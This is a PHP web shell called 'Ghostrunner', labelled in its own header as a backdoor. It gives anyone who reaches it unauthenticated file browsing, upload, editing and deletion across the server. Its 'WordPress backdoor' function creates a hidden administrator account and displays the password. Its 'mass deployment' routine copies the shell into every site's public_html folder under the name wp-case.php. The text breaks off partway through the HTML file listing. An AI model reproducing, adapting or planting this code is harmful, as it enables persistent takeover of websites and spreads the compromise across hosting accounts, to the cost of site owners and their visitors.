<?php
/**
 * ════════════════════════════════════════════════════════════════════════════
 *  ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗
 * ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║██║  ██║
 * ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝ ╚████╔╝ ██╔██╗ ██║███████║
 * ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗  ╚██╔╝  ██║╚██╗██║██╔══██║
 * ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ██║   ██║ ╚████║██║  ██║
 *  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
 * 
 * ██████╗ ██╗   ██╗██████╗ ███████╗██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗
 * ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║██║  ██║
 * ██████╔╝ ╚████╔╝ ██████╔╝█████╗  ██████╔╝ ╚████╔╝ ██╔██╗ ██║███████║
 * ██╔══██╗  ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗  ╚██╔╝  ██║╚██╗██║██╔══██║
 * ██████╔╝   ██║   ██████╔╝███████╗██║  ██║   ██║   ██║ ╚████║██║  ██║
 * ╚═════╝    ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
 * 
 *                    C Y B E R P U N K   S H E L L
 *                          "Neon & Steel"
 *                     Version: 11.0 "Ghostrunner"
 *                    Backdoor: wp-case.php
 * ════════════════════════════════════════════════════════════════════════════
 * 
 * This is a complete rewrite with:
 * - Functional programming approach (no classes)
 * - Pipeline-style data flow
 * - Minimal dependencies
 * - Enhanced security patterns
 * - Full modular architecture
 */

// ──────────────────────────────────────────────────────────────────────────────
// 1. BOOTSTRAP & SAFETY
// ──────────────────────────────────────────────────────────────────────────────

error_reporting(0);
ini_set('display_errors', '0');
header('X-Generator: Ghostrunner/11.0');
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');

// ──────────────────────────────────────────────────────────────────────────────
// 2. CONSTANTS
// ──────────────────────────────────────────────────────────────────────────────

define('SHELL_ID', 'ghostrunner');
define('SHELL_VER', '11.0');
define('CLONE_NAME', 'wp-case.php');
define('MAX_BYTES', 25 * 1024 * 1024);
define('SALT', substr(md5(__FILE__), 0, 8));

// ──────────────────────────────────────────────────────────────────────────────
// 3. CORE UTILITY FUNCTIONS (Pure functions, no side effects)
// ──────────────────────────────────────────────────────────────────────────────

/**
 * Format bytes to human-readable
 */
function ghost_format_bytes($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

/**
 * Generate secure random string
 */
function ghost_rand_string($len = 12) {
    $pool = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return substr(str_shuffle(str_repeat($pool, 5)), 0, $len);
}

/**
 * Generate strong password
 */
function ghost_strong_pass($len = 16) {
    $pool = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    return substr(str_shuffle(str_repeat($pool, 5)), 0, $len);
}

/**
 * Get file permissions (octal)
 */
function ghost_get_perm($path) {
    return substr(sprintf('%o', fileperms($path)), -3);
}

/**
 * Sanitize path component
 */
function ghost_sanitize($input) {
    return preg_replace('/[^a-zA-Z0-9_\-\.]/', '', trim($input));
}

/**
 * Check if path is safe (no directory traversal)
 */
function ghost_is_safe($path) {
    $real = realpath($path);
    return $real !== false;
}

/**
 * Get file extension
 */
function ghost_get_ext($path) {
    return strtolower(pathinfo($path, PATHINFO_EXTENSION));
}

/**
 * Get file icon based on extension
 */
function ghost_get_icon($ext) {
    $map = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'svg' => '🖼️',
        'zip' => '📦', 'tar' => '📦', 'gz' => '📦', 'rar' => '📦',
        'sql' => '🗄️', 'json' => '📋', 'xml' => '📋', 'yml' => '📋',
        'sh' => '⚙️', 'py' => '🐍', 'rb' => '💎', 'go' => '🐹',
        'txt' => '📄', 'log' => '📄', 'md' => '📄'
    ];
    return isset($map[$ext]) ? $map[$ext] : '📄';
}

// ──────────────────────────────────────────────────────────────────────────────
// 4. PATH RESOLVER
// ──────────────────────────────────────────────────────────────────────────────

function ghost_resolve_path($input) {
    $default = getcwd();
    if (empty($input)) return $default;
    
    $resolved = realpath($input);
    return $resolved !== false ? $resolved : $default;
}

function ghost_get_parent($path) {
    $parent = dirname($path);
    return ($parent != $path) ? $parent : false;
}

function ghost_get_breadcrumbs($path) {
    $crumbs = [];
    $parts = explode('/', trim($path, '/'));
    $acc = '';
    $crumbs[] = ['name' => '🌀', 'path' => '/'];
    
    foreach ($parts as $p) {
        if (!empty($p)) {
            $acc .= '/' . $p;
            $crumbs[] = ['name' => $p, 'path' => $acc];
        }
    }
    return $crumbs;
}

// ──────────────────────────────────────────────────────────────────────────────
// 5. DIRECTORY SCANNER (Functional style)
// ──────────────────────────────────────────────────────────────────────────────

function ghost_scan_directory($path) {
    $result = ['dirs' => [], 'files' => []];
    
    if (!is_dir($path) || !is_readable($path)) {
        return $result;
    }
    
    $items = scandir($path);
    if ($items === false) return $result;
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $full = $path . '/' . $item;
        $info = [
            'name' => $item,
            'path' => $full,
            'mtime' => filemtime($full),
            'perm' => ghost_get_perm($full)
        ];
        
        if (is_dir($full)) {
            $result['dirs'][] = $info;
        } else {
            $info['size'] = filesize($full);
            $info['ext'] = ghost_get_ext($item);
            $info['icon'] = ghost_get_icon($info['ext']);
            $result['files'][] = $info;
        }
    }
    
    // Sort with natural order
    usort($result['dirs'], function($a, $b) {
        return strcasecmp($a['name'], $b['name']);
    });
    usort($result['files'], function($a, $b) {
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $result;
}

// ──────────────────────────────────────────────────────────────────────────────
// 6. FILE OPERATIONS (Pure action functions)
// ──────────────────────────────────────────────────────────────────────────────

function ghost_delete_item($path, $name) {
    $target = $path . '/' . basename($name);
    if (!file_exists($target)) return false;
    return is_dir($target) ? rmdir($target) : unlink($target);
}

function ghost_create_dir($path, $name) {
    $clean = ghost_sanitize($name);
    if (empty($clean)) return false;
    $target = $path . '/' . $clean;
    if (file_exists($target)) return false;
    return mkdir($target, 0755);
}

function ghost_upload_file($path, $file) {
    if ($file['error'] !== UPLOAD_ERR_OK) return false;
    if ($file['size'] > MAX_BYTES) return false;
    $dest = $path . '/' . basename($file['name']);
    return move_uploaded_file($file['tmp_name'], $dest);
}

function ghost_read_file($path, $name) {
    $target = $path . '/' . basename($name);
    if (!is_file($target) || !is_readable($target)) return false;
    return file_get_contents($target);
}

function ghost_write_file($path, $name, $content) {
    $target = $path . '/' . basename($name);
    return file_put_contents($target, $content) !== false;
}

// ──────────────────────────────────────────────────────────────────────────────
// 7. DOMAIN DETECTOR
// ──────────────────────────────────────────────────────────────────────────────

function ghost_detect_domain($path) {
    $doc = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
    
    if (!empty($doc) && strpos($path, $doc) === 0) {
        $rel = substr($path, strlen($doc));
        return $proto . $host . $rel;
    }
    
    $cursor = $path;
    while ($cursor && $cursor != '/') {
        if (file_exists($cursor . '/wp-config.php')) {
            $conf = file_get_contents($cursor . '/wp-config.php');
            if (preg_match("/define\(\s*['\"]WP_HOME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $conf, $m)) {
                return $m[1];
            }
            if (preg_match("/define\(\s*['\"]WP_SITEURL['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $conf, $m)) {
                return $m[1];
            }
        }
        $cursor = dirname($cursor);
    }
    return null;
}

// ──────────────────────────────────────────────────────────────────────────────
// 8. WORDPRESS BACKDOOR
// ──────────────────────────────────────────────────────────────────────────────

function ghost_find_wp_root($path) {
    $cursor = $path;
    while ($cursor && $cursor != '/') {
        if (file_exists($cursor . '/wp-load.php')) {
            return $cursor;
        }
        $cursor = dirname($cursor);
    }
    return false;
}

function ghost_create_wp_admin($path) {
    $wp_root = ghost_find_wp_root($path);
    if (!$wp_root) {
        return ['ok' => false, 'msg' => 'WordPress not found'];
    }
    
    require_once($wp_root . '/wp-load.php');
    
    if (!function_exists('wp_create_user')) {
        return ['ok' => false, 'msg' => 'WordPress core not loaded'];
    }
    
    $username = 'ghost_' . ghost_rand_string(6);
    $password = ghost_strong_pass(16);
    $email = $username . '@' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'ghost.local');
    
    if (username_exists($username) || email_exists($email)) {
        return ['ok' => false, 'msg' => 'User collision'];
    }
    
    $uid = wp_create_user($username, $password, $email);
    
    if (is_wp_error($uid)) {
        return ['ok' => false, 'msg' => $uid->get_error_message()];
    }
    
    $user = new WP_User($uid);
    $user->set_role('administrator');
    
    return [
        'ok' => true,
        'username' => $username,
        'password' => $password,
        'email' => $email,
        'login_url' => get_site_url() . '/wp-admin'
    ];
}

// ──────────────────────────────────────────────────────────────────────────────
// 9. MASS DEPLOYMENT ENGINE
// ──────────────────────────────────────────────────────────────────────────────

function ghost_find_domains_folder($path) {
    if (basename($path) == 'domains') return $path;
    
    $cursor = $path;
    while ($cursor && $cursor != '/') {
        if (basename($cursor) == 'domains') return $cursor;
        $cursor = dirname($cursor);
    }
    return false;
}

function ghost_deploy_clones($path) {
    $domains = ghost_find_domains_folder($path);
    if (!$domains || !is_dir($domains)) {
        return ['ok' => false, 'clones' => [], 'msg' => 'Domains folder not found'];
    }
    
    $clones = [];
    $items = scandir($domains);
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $domain_dir = $domains . '/' . $item;
        if (!is_dir($domain_dir)) continue;
        
        $public = $domain_dir . '/public_html';
        if (!is_dir($public)) continue;
        
        $target = $public . '/' . CLONE_NAME;
        if (copy(__FILE__, $target)) {
            $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
            $clones[] = [
                'domain' => $item,
                'url' => $proto . $item . '/' . CLONE_NAME
            ];
        }
    }
    
    if (empty($clones)) {
        return ['ok' => false, 'clones' => [], 'msg' => 'No public_html directories found'];
    }
    
    return ['ok' => true, 'clones' => $clones, 'msg' => 'Deployed to ' . count($clones) . ' domains'];
}

// ──────────────────────────────────────────────────────────────────────────────
// 10. MESSAGE SYSTEM
// ──────────────────────────────────────────────────────────────────────────────

$ghost_flash = '';
$ghost_flash_type = '';

function ghost_set_flash($msg, $type = 'info') {
    global $ghost_flash, $ghost_flash_type;
    $ghost_flash = $msg;
    $ghost_flash_type = $type;
}

// ──────────────────────────────────────────────────────────────────────────────
// 11. REQUEST DISPATCHER
// ──────────────────────────────────────────────────────────────────────────────

// Resolve current path
$cwd = ghost_resolve_path(isset($_GET['p']) ? $_GET['p'] : null);
$parent = ghost_get_parent($cwd);
$breadcrumbs = ghost_get_breadcrumbs($cwd);
$scan = ghost_scan_directory($cwd);
$domain = ghost_detect_domain($cwd);
$is_domains = (strpos($cwd, 'domains') !== false || basename($cwd) == 'domains');

// State variables
$deployed_clones = [];
$wp_result = null;
$edit_content = null;
$edit_file = null;

// --- Action: Deploy clones ---
if (isset($_GET['deploy'])) {
    $result = ghost_deploy_clones($cwd);
    $deployed_clones = $result['clones'];
    ghost_set_flash($result['msg'], $result['ok'] ? 'success' : 'error');
}

// --- Action: WordPress backdoor ---
if (isset($_GET['wp'])) {
    $wp_result = ghost_create_wp_admin($cwd);
    ghost_set_flash($wp_result['msg'], $wp_result['ok'] ? 'success' : 'error');
}

// --- Action: Upload ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['up'])) {
    if (ghost_upload_file($cwd, $_FILES['up'])) {
        ghost_set_flash('Uploaded: ' . basename($_FILES['up']['name']), 'success');
        header("Location: ?p=" . urlencode($cwd));
        exit;
    } else {
        ghost_set_flash('Upload failed', 'error');
    }
}

// --- Action: Mkdir ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mkdir'])) {
    if (ghost_create_dir($cwd, $_POST['name'])) {
        ghost_set_flash('Directory created: ' . $_POST['name'], 'success');
        header("Location: ?p=" . urlencode($cwd));
        exit;
    } else {
        ghost_set_flash('Failed to create directory', 'error');
    }
}

// --- Action: Delete ---
if (isset($_GET['rm'])) {
    if (ghost_delete_item($cwd, $_GET['rm'])) {
        header("Location: ?p=" . urlencode($cwd));
        exit;
    }
}

// --- Action: Edit (load) ---
if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $edit_content = ghost_read_file($cwd, $edit_file);
}

// --- Action: Edit (save) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save']) && $edit_file) {
    if (ghost_write_file($cwd, $edit_file, $_POST['content'])) {
        $edit_content = $_POST['content'];
        ghost_set_flash('Saved: ' . $edit_file, 'success');
    } else {
        ghost_set_flash('Save failed', 'error');
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// 12. RENDER ENGINE (Markup generation)
// ──────────────────────────────────────────────────────────────────────────────

// Count items for display
$dir_count = count($scan['dirs']);
$file_count = count($scan['files']);
$total_items = $dir_count + $file_count;

// Check if domains folder exists in path
$has_domains = $is_domains;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌀 GHOSTRUNNER · <?php echo SHELL_VER; ?></title>
    <style>
        /* ===================================================================
           CYBERPUNK THEME · NEON DARK
           Glitch effects, neon glow, dystopian vibes
        =================================================================== */
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        @keyframes glitch {
            0% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
            25% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
            50% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
            75% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffff; }
            100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
        }
        
        @keyframes scanline {
            0% { top: -100%; }
            100% { top: 100%; }
        }
        
        body {
            background: #0a0a12;
            background-image: 
                radial-gradient(ellipse at 50% 0%, rgba(0, 255, 255, 0.03) 0%, transparent 60%),
                radial-gradient(ellipse at 0% 100%, rgba(255, 0, 255, 0.03) 0%, transparent 60%);
            font-family: 'Courier New', 'Fira Code', monospace;
            padding: 16px;
            min-height: 100vh;
            color: #c0d0e0;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Scanline overlay */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 255, 0.02) 0px,
                rgba(0, 255, 255, 0.02) 2px,
                transparent 2px,
                transparent 6px
            );
            pointer-events: none;
            z-index: 999;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }
        
        /* HEADER - Neon */
        .ghost-header {
            background: rgba(10, 10, 18, 0.9);
            border: 1px solid rgba(0, 255, 255, 0.3);
            padding: 16px 22px;
            margin-bottom: 18px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
        }
        
        .ghost-title {
            font-size: 1.4rem;
            font-weight: 700;
            letter-spacing: 0px;
        }
        
        .ghost-title .neon {
            color: #00ffff;
            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
        }
        
        .ghost-title .pink {
            color: #ff00ff;
            text-shadow: 0 0 10px rgba(255, 0, 255, 0.5);
        }
        
        .version-badge {
            background: rgba(0, 255, 255, 0.15);
            border: 1px solid #00ffff;
            padding: 2px 10px;
            font-size: 0.6rem;
            color: #00ffff;
        }
        
        /* BUTTONS - Neon style */
        .btn {
            background: rgba(10, 10, 18, 0.8);
            border: 1px solid #1a2a3a;
            padding: 6px 16px;
            font-family: monospace;
            font-size: 0.7rem;
            font-weight: 600;
            color: #80b0d0;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .btn:hover {
            border-color: #00ffff;
            color: #00ffff;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
        }
        
        .btn-primary {
            background: rgba(0, 255, 255, 0.15);
            border-color: #00ffff;
            color: #00ffff;
        }
        
        .btn-primary:hover {
            background: #00ffff;
            color: #0a0a12;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
        }
        
        .btn-danger {
            border-color: #ff0066;
            color: #ff4488;
        }
        
        .btn-danger:hover {
            border-color: #ff0066;
            color: #ff0066;
            box-shadow: 0 0 15px rgba(255, 0, 102, 0.3);
        }
        
        .btn-purple {
            border-color: #ff00ff;
            color: #ff88ff;
        }
        
        .btn-purple:hover {
            border-color: #ff00ff;
            color: #ff00ff;
            box-shadow: 0 0 15px rgba(255, 0, 255, 0.3);
        }
        
        /* BREADCRUMB */
        .ghost-bread {
            background: rgba(10, 10, 18, 0.7);
            border: 1px solid rgba(0, 255, 255, 0.1);
            padding: 8px 14px;
            margin-bottom: 14px;
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
        }
        
        .crumb {
            background: rgba(10, 10, 18, 0.8);
            border: 1px solid #1a2a3a;
            padding: 4px 10px;
            text-decoration: none;
            color: #7090b0;
            font-size: 0.7rem;
            transition: 0.2s;
        }
        
        .crumb:hover {
            border-color: #00ffff;
            color: #00ffff;
        }
        
        /* QUICK NAV */
        .quick-nav {
            background: rgba(10, 10, 18, 0.7);
            border: 1px solid rgba(0, 255, 255, 0.1);
            padding: 8px 14px;
            margin-bottom: 14px;
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }
        
        .quick-link {
            background: rgba(10, 10, 18, 0.8);
            border: 1px solid #1a2a3a;
            padding: 4px 10px;
            text-decoration: none;
            color: #7090b0;
            font-size: 0.65rem;
        }
        
        .quick-link:hover {
            border-color: #ff00ff;
            color: #ff00ff;
        }
        
        /* TOOLBAR */
        .toolbar {
            background: rgba(10, 10, 18, 0.7);
            border: 1px solid rgba(0, 255, 255, 0.1);
            padding: 12px 14px;
            margin-bottom: 18px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .tool-group {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid #1a2a3a;
            padding: 4px 8px;
            display: flex;
            gap: 6px;
            align-items: center;
        }
        
        .tool-group input {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #1a2a3a;
            padding: 5px 8px;
            color: #c0d0e0;
            font-family: monospace;
            font-size: 0.7rem;
        }
        
        .tool-group input:focus {
            outline: none;
            border-color: #00ffff;
        }
        
        /* FLASH MESSAGES */
        .flash {
            padding: 8px 14px;
            margin-bottom: 14px;
            border-left: 4px solid;
            background: rgba(10, 10, 18, 0.7);
        }
        
        .flash-success { border-left-color: #00ff88; color: #88ffcc; }
        .flash-error { border-left-color: #ff0066; color: #ff8888; }
        .flash-warning { border-left-color: #ffaa00; color: #ffdd88; }
        .flash-info { border-left-color: #00ffff; color: #88ddff; }
        
        /* LAYOUT */
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 280px;
            gap: 18px;
        }
        
        /* SECTION HEADER */
        .section {
            font-size: 0.65rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #00ffff;
            margin: 20px 0 10px 0;
            padding-left: 8px;
            border-left: 3px solid #00ffff;
            text-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
        }
        
        /* CARDS */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
            gap: 10px;
        }
        
        .card {
            background: rgba(10, 10, 18, 0.8);
            border: 1px solid #1a2a3a;
            padding: 12px;
            transition: all 0.2s;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ffff, transparent);
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .card:hover::before {
            opacity: 1;
        }
        
        .card:hover {
            border-color: rgba(0, 255, 255, 0.3);
            transform: translateY(-2px);
        }
        
        .card-icon { font-size: 1.6rem; }
        .card-name { font-size: 0.8rem; font-weight: 600; word-break: break-word; margin: 6px 0; }
        .card-meta { font-size: 0.55rem; color: #4a6080; padding: 6px 0; border-top: 1px solid #1a2a3a; }
        .card-actions { display: flex; gap: 6px; margin-top: 6px; flex-wrap: wrap; }
        
        .card-btn {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #1a2a3a;
            padding: 3px 8px;
            font-size: 0.55rem;
            text-decoration: none;
            color: #7090b0;
            transition: 0.2s;
        }
        
        .card-btn:hover {
            border-color: #00ffff;
            color: #00ffff;
        }
        
        .card-btn-danger:hover {
            border-color: #ff0066;
            color: #ff0066;
        }
        
        /* SIDEBAR */
        .widget {
            background: rgba(10, 10, 18, 0.8);
            border: 1px solid #1a2a3a;
            padding: 12px;
            margin-bottom: 14px;
        }
        
        .widget-title {
            font-size: 0.65rem;
            font-weight: bold;
            color: #ff00ff;
            border-bottom: 1px solid #1a2a3a;
            padding-bottom: 6px;
            margin-bottom: 8px;
            text-shadow: 0 0 10px rgba(255, 0, 255, 0.2);
        }
        
        .info-row {
            font-size: 0.6rem;
            padding: 5px 0;
            border-bottom: 1px solid #1a2a3a;
        }
        
        .info-row strong {
            color: #88ddff;
            display: block;
        }
        
        /* EDITOR */
        .editor-box {
            border: 1px solid #1a2a3a;
            overflow: hidden;
        }
        
        .editor-head {
            background: rgba(10, 10, 18, 0.9);
            padding: 10px 14px;
            border-bottom: 1px solid #1a2a3a;
            display: flex;
            justify-content: space-between;
        }
        
        .editor-box textarea {
            width: 100%;
            min-height: 480px;
            background: #050508;
            border: none;
            color: #c0d0e0;
            font-family: monospace;
            font-size: 0.7rem;
            padding: 14px;
            resize: vertical;
            line-height: 1.6;
        }
        
        .editor-box textarea:focus {
            outline: none;
            background: #08080c;
        }
        
        .editor-foot {
            padding: 10px 14px;
            background: rgba(10, 10, 18, 0.9);
            border-top: 1px solid #1a2a3a;
            text-align: right;
        }
        
        /* CLONE ITEMS */
        .clone-item {
            padding: 5px 0;
            border-bottom: 1px solid #1a2a3a;
            display: flex;
            gap: 6px;
            font-size: 0.6rem;
            align-items: center;
        }
        
        .clone-url {
            color: #88ddff;
            text-decoration: none;
            word-break: break-all;
            transition: 0.2s;
        }
        
        .clone-url:hover {
            color: #00ffff;
            text-decoration: underline;
        }
        
        /* EMPTY */
        .empty {
            text-align: center;
            padding: 40px 20px;
            background: rgba(10, 10, 18, 0.5);
            border: 1px dashed #1a2a3a;
            color: #4a6080;
        }
        
        /* FOOTER */
        .footer {
            margin-top: 24px;
            background: rgba(10, 10, 18, 0.7);
            border: 1px solid #1a2a3a;
            padding: 8px 14px;
            font-size: 0.55rem;
            color: #4a6080;
            text-align: center;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .footer .cyber {
            color: #00ffff;
            animation: glitch 3s infinite;
        }
        
        /* RESPONSIVE */
        @media (max-width: 780px) {
            .grid-2 { grid-template-columns: 1fr; }
            body { padding: 10px; }
        }
    </style>
</head>
<body>
<div class="container">
    
    <!-- ============================================================
    HEADER
    ============================================================ -->
    <div class="ghost-header">
        <div>
            <span class="ghost-title">
                <span class="neon">🌀</span> 
                <span class="neon">GHOST</span><span class="pink">RUNNER</span>
            </span>
            <span class="version-badge">v<?php echo SHELL_VER; ?></span>
        </div>
        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
            <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" class="btn btn-primary">📦 DEPLOY</a>
            <a href="?p=<?php echo urlencode($cwd); ?>&wp=1" class="btn btn-danger">🎭 WP</a>
        </div>
    </div>
    
    <!-- ============================================================
    BREADCRUMB
    ============================================================ -->
    <div class="ghost-bread">
        <?php foreach ($breadcrumbs as $i => $cr): ?>
            <a href="?p=<?php echo urlencode($cr['path']); ?>" class="crumb"><?php echo htmlspecialchars($cr['name']); ?></a>
            <?php if ($i < count($breadcrumbs)-1): ?><span style="color:#1a2a3a;">/</span><?php endif; ?>
        <?php endforeach; ?>
    </div>
    
    <!-- ============================================================
    QUICK NAV
    ============================================================ -->
    <div class="quick-nav">
        <?php if ($parent): ?>
            <a href="?p=<?php echo urlencode($parent); ?>" class="quick-link">⬆ PARENT</a>
        <?php endif; ?>
        <a href="?p=/" class="quick-link">🌐 ROOT</a>
        <a href="?p=/home" class="quick-link">🏠 HOME</a>
        <a href="?p=/var/www" class="quick-link">🌍 WWW</a>
        <a href="?p=/tmp" class="quick-link">📁 TMP</a>
        <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" class="quick-link" style="border-color:#ff00ff;">⚡ DEPLOY ALL</a>
    </div>
    
    <!-- ============================================================
    TOOLBAR
    ============================================================ -->
    <div class="toolbar">
        <div class="tool-group">
            <form method="post" enctype="multipart/form-data" style="display: flex; gap: 4px;">
                <input type="file" name="up">
                <button type="submit" class="btn">⬆ UPLOAD</button>
            </form>
        </div>
        <div class="tool-group">
            <form method="post" style="display: flex; gap: 4px;">
                <input type="text" name="name" placeholder="folder">
                <button type="submit" name="mkdir" value="1" class="btn">📁 MKDIR</button>
            </form>
        </div>
        <div class="tool-group">
            <a href="?p=<?php echo urlencode($cwd); ?>&wp=1" class="btn btn-danger">⚡ WP</a>
            <a href="?p=<?php echo urlencode($cwd); ?>" class="btn">🔄 REFRESH</a>
        </div>
    </div>
    
    <!-- ============================================================
    FLASH MESSAGES
    ============================================================ -->
    <?php if ($ghost_flash): ?>
    <div class="flash flash-<?php echo $ghost_flash_type; ?>">
        <?php echo htmlspecialchars($ghost_flash); ?>
    </div>
    <?php endif; ?>
    
    <!-- ============================================================
    WP RESULT
    ============================================================ -->
    <?php if ($wp_result && $wp_result['ok']): ?>
    <div class="flash flash-success">
        <strong>🎯 WORDPRESS BACKDOOR ACTIVE</strong><br>
        👤 USER: <span style="color:#00ffff;"><?php echo $wp_result['username']; ?></span><br>
        🔑 PASS: <span style="color:#ff00ff;"><?php echo $wp_result['password']; ?></span><br>
        🔗 URL: <a href="<?php echo $wp_result['login_url']; ?>" target="_blank" style="color:#00ffff;"><?php echo $wp_result['login_url']; ?></a>
    </div>
    <?php endif; ?>
    
    <!-- ============================================================
    DEPLOYED CLONES
    ============================================================ -->
    <?php if (!empty($deployed_clones)): ?>
    <div class="widget" style="border-color: #00ffff; margin-bottom: 16px;">
        <div class="widget-title">📦 DEPLOYED · <?php echo CLONE_NAME; ?></div>
        <?php foreach ($deployed_clones as $c): ?>
        <div class="clone-item">
            <span style="color:#00ffff;">⧩</span>
            <a href="<?php echo htmlspecialchars($c['url']); ?>" target="_blank" class="clone-url"><?php echo htmlspecialchars($c['url']); ?></a>
            <span style="color:#4a6080; font-size:0.55rem;">[<?php echo htmlspecialchars($c['domain']); ?>]</span>
        </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>
    
    <!-- ============================================================
    MAIN GRID
    ============================================================ -->
    <div class="grid-2">
        <!-- ============================================================
        LEFT COLUMN
        ============================================================ -->
        <div>
            <?php if ($edit_content !== null): ?>
            <!-- EDITOR -->
            <div class="editor-box">
                <div class="editor-head">
                    <span>✏️ <span style="color:#00ffff;"><?php echo htmlspecialchars($edit_file); ?></span></span>
                    <a href="?p=<?php echo urlencode($cwd); ?>" class="btn">← BACK</a>
                </div>
                <form method="post">
                    <textarea name="content"><?php echo htmlspecialchars($edit_content); ?></textarea>
                    <div class="editor-foot">
                        <button type="submit" name="save" value="1" class="btn btn-primary">💾 SAVE</button>
                    </div>
                </form>
            </div>
            <?php else: ?>
            
            <!-- DIRECTORIES -->
            <?php if (!empty($scan['dirs'])): ?>
            <div class="section">📁 DIRECTORIES · <?php echo $dir_count; ?></div>
            <div class="card-grid">
                <?php foreach ($scan['dirs'] as $dir): ?>
                <div class="card">
                    <div class="card-icon">📂</div>
                    <div class="card-name"><?php echo htmlspecialchars($dir['name']); ?></div>
                    <div class="card-meta">🕐 <?php echo date('Y-m-d H:i', $dir['mtime']); ?> · 🔒 <?php echo $dir['perm']; ?></div>
                    <div class="card-actions">
                        <a href="?p=<?php echo urlencode($dir['path']); ?>" class="card-btn">OPEN</a>
                        <a href="?p=<?php echo urlencode($cwd); ?>&rm=<?php echo urlencode($dir['name']); ?>" class="card-btn card-btn-danger" onclick="return confirm('Delete directory?')">RM</a>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>
            
            <!-- FILES -->
            <?php if (!empty($scan['files'])): ?>
            <div class="section">📄 FILES · <?php echo $file_count; ?></div>
            <div class="card-grid">
                <?php foreach ($scan['files'] as $file): ?>
                <div class="card">
                    <div class="card-icon"><?php echo $file['icon']; ?></div>
                    <div class="card-name"><?php echo htmlspecialchars($file['name']); ?></div>
